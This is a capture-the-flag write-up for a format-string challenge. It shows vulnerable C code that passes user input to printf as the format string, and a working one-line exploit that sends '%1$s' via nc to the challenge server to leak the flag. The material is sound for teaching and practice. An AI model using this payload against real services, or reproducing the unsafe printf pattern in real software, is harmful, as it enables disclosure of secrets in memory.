# Cyberphobia: Formatting Nightmare

Category: binrev | Points: 608 | Solves: 93

## Flag
spooky{f0rm4tStr1ngVulN3r4b1lityIsSc4rY}

## Steps

`fsvchall2.c`:

```c
void vuln(const char *secret) {
 char input[256];
 printf("Input: ");
 if (fgets(input, sizeof(input), stdin) == NULL) return;
 printf(input, secret); // <-- user-controlled format string
 printf("\n");
}

int main(void) {
 char secret[256];
 FILE *fp = fopen("/opt/ctf/chall2/secret.txt", "r");
 ...
 vuln(secret); // secret (the flag) is the format-string arg
}
```

`printf(input, secret)` with attacker-controlled `input` = classic format-string
vuln. `secret` is the *first* variadic argument, so positional `%1$s` tells
printf to dereference it as a char* and print it. No need for `%p` stack spelunking.

```
printf '%%1$s\n' | nc 18.226.103.146 9002
Input: f0rm4tStr1ngVulN3r4b1lityIsSc4rY
```
(`%2$s` yields the same — the flag sits at arg 1.)

Wrap per the challenge note ("flag can only be fetched from the remote server,
wrap answer in spooky{}") -> `spooky{f0rm4tStr1ngVulN3r4b1lityIsSc4rY}`.
